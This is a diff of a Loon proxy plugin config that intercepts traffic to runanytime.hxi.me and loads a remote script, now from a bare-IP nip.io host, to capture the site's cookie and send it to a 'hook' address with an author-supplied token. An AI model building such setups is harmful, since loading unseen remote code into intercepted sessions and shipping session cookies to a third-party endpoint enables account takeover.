@@ -11,7 +11,8 @@ hook = input,"",tag=投递地址,desc=形如 https://ra.xxx.nip.io/<暗号>/cook
 token = input,"",tag=令牌,desc=X-Token 的值，由我提供
 
 [Script]
-request if ${url} ~= /^https:\/\/runanytime\.hxi\.me\// then script("https://raw.githubusercontent.com/BeThyself/loon/main/runanytime/runanytime-capture.js", {${hook}, ${token}}) with tag="RunAnyTime 抓 Cookie", timeout=70, requires_body=false
+generic then script("https://ra.161.33.211.131.nip.io/s/runanytime-capture.js", {${hook}, ${token}}) with img_url="stethoscope", tag="RunAnyTime 自检", timeout=30
+request if ${url} ~= /^https:\/\/runanytime\.hxi\.me\// then script("https://ra.161.33.211.131.nip.io/s/runanytime-capture.js", {${hook}, ${token}}) with tag="RunAnyTime 抓 Cookie", timeout=70, requires_body=false
 
 [MITM]
 hostname = runanytime.hxi.me
